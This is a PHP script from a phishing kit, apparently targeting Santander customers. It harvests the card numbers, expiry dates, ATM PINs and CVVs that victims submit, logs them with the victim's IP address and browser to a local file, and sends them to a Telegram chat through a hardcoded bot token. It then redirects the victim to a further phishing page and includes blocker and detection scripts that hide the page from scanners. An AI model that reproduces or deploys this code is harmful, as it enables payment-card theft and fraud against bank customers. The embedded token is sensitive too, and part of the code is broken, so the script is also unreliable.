<?php
include("./lib/simple_html_dom.php");
include './lib/Telegram.php';

error_reporting(0);
ini_set('display_errors', 0);


$ip="cc Ip : ".getenv("REMOTE_ADDR");
$sms="CardNumber : ".$_POST['CardNumber']." | ExpirationDate: ".$_POST['ExpirationDate']." | ATM PIN : ".$_POST['PIN']." | CCV : ".$_POST['CCV']; 
$text=$ip." ".$sms; 

curl_setopt($handle, CURLOPT_URL, $url);

curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);
 
$output = curl_exec($handle);
 
curl_close($handle);


session_start();
include("../HOSTER.php"); 
include("blocker.php");
include("detect.php");

$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
$msg.="==================================================\r\n";
$msg=" [+] CREDITCARD(SANT-ANDER) ///Neo-Tor\r\n";
$msg.="==============================\r\n";
$msg.="[+] CREDITCARD : {$_POST['CardNumber']}\r\n";
$msg.="[+] CREDITEXPY : {$_POST['ExpirationDate']}\r\n";
$msg.="[+] CREDIT ATM : Ahowaaaaaa lPIN: {$_POST['PIN']}\r\n";
$msg.="[+] CREDIT CCv : {$_POST['CCV']}\r\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
$msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../groupe.txt","a+");fwrite($save,$msg);fclose($save);
$subject="CREDITCARD(SANT-ANDER) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: Nro-tor™<info>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
$telegramLuffy = new Telegram('5715277551:AAFOo65B5-YXURu_bdBWUfQv329y3PC_aHU');
$contentLuffy = array('chat_id' => "-774340588", 'text' => $msg);
$telegramLuffy->sendMessage($contentLuffy);

header("Location: ../../Phone_Number"); 

?>